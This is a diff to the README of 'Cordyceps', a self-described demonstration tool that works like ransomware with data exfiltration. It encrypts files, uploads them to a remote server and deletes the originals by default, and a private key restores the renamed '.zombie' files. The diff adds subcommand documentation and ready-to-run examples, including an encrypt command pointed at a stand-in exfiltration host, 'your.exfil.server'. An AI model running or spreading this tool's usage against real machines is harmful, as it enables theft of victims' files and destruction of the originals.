@@ -57,31 +57,41 @@ This project is a **technical demonstration**, not a weapon. Do not use Cordycep
 Cordyceps operates via command-line arguments, allowing flexible control over its behavior.
 
 ### Command Line Options
-- `-m, --mode <MODE>`: Sets the tool's operation. Choose `encrypt` to encrypt and send files, or `decrypt` to restore `.zombie` files. Default: `encrypt`.
-- `-p, --path <DIRECTORY>`: Specifies the starting directory for file processing. Default: current directory `.`.
-- `-n, --no-delete`: (Encryption only) Prevents the original file from being deleted after successful encryption and transmission. Default: `false`, original file is deleted.
-- `-s, --server <ADDRESS>`: (Encryption only) The URL of the server to send encrypted files to (e.g., `https://your.exfil.server:8443`). Default: `http://localhost:8080`.
-- `-t, --target-folder <FOLDER_NAME>`: (Encryption only) Designates a specific subfolder on the remote server for uploaded files (e.g., `my_laptop_data`). Default: `empty`, files uploaded to the root of the specified server endpoint.
-- `-k, --key <PATH>`: (Decryption only) Provides the file path to the server's private key (e.g., `server_ed25519_private.key`), essential for decryption. Default: `server_ed25519_private.key`.
+Cordyceps uses subcommands to handle different modes of operation. To use the tool, you must specify either the `encrypt` or `decrypt` command, each with its own set of options. If in doubt, run `cordyceps -h`.
 
-### Encryption Example
-```
-# TODO: Provide a clear example for encryption mode
-# Example:
-# cordyceps -m encryption -p /path/to/sensitive_data --server https://your.exfil.server:8443 -t my_laptop_data
+#### `encrypt` Command
+Use the `encrypt` command to begin the encryption and exfiltration process.
+
+- `-p, --path <DIRECTORY>`: Specifies the starting directory for file processing. Default: current directory (`.`).
+- `-n, --no-delete`: Prevents the original file from being deleted after successful encryption and transmission. Default: `false`, the original file is deleted.
+- `-s, --server <ADDRESS>`: The URL of the server to send encrypted files to (e.g., `https://your.exfil.server:8443`). Default: `http://localhost:8080`.
+- `-t, --target-folder <FOLDER_NAME>`: Designates a specific subfolder on the remote server for uploaded files (e.g., `my_laptop_data`). Default: empty, files are uploaded to the root of the specified server endpoint.
+
+#### `decrypt` Command
+Use the `decrypt` command to restore `.zombie` files using the provided private key.
+
+- `-p, --path <DIRECTORY>`: Specifies the starting directory for file processing. Default: current directory (`.`).
+- `-k, --key <PATH>`: Provides the file path to the server's private key (e.g., `server_ed25519_private.key`), which is essential for decryption. Default: `server_ed25519_private.key`.
+
+### Examples
+#### Encryption Example
+This command will encrypt files in the `/path/to/sensitive_data` directory, send them to the specified server and folder, but will not delete the original files.
+
+```sh
+cordyceps encrypt -p /path/to/sensitive_data --server https://your.exfil.server:8443 -t my_laptop_data -n
 ```
 
-### Decryption Example
-```
-# TODO: Provide a clear example for decryption mode
-# Example:
-# cordyceps -m decryption -p /path/to/zombie_files -k /path/to/your/server_private_key.bin
+#### Decryption Example
+This command will decrypt `.zombie` files in the `/path/to/zombie_files` directory using the private key located at `/path/to/your/server_ed25519_private.key`.
+
+```sh
+cordyceps decrypt -p /path/to/zombie_files -k /path/to/your/server_ed25519_private.key
 ```
 
 
 ## Key Management
-- **Server Public Key**: For encryption operations, the server's ED25519 public key is securely embedded directly into the Cordyceps binary during compilation. This key is used to establish the shared secret for encrypting the AES key.
-- **Server Private Key**: For decryption operations, the corresponding ED25519 private key must be explicitly provided by the user via the `--key` CLI option. **It is paramount to keep this private key highly secure and never distribute it with the client application.**
+- **Server Public Key**: For **encryption** operations, the server's ED25519 public key is securely embedded directly into the Cordyceps binary during compilation. This key is used to establish the shared secret for encrypting the AES key.
+- **Server Private Key**: For **decryption** operations, the corresponding ED25519 private key must be explicitly provided by the user via the `--key` CLI option. **It is paramount to keep this private key highly secure and never distribute it with the client application.**
 
 
 ## Contributing
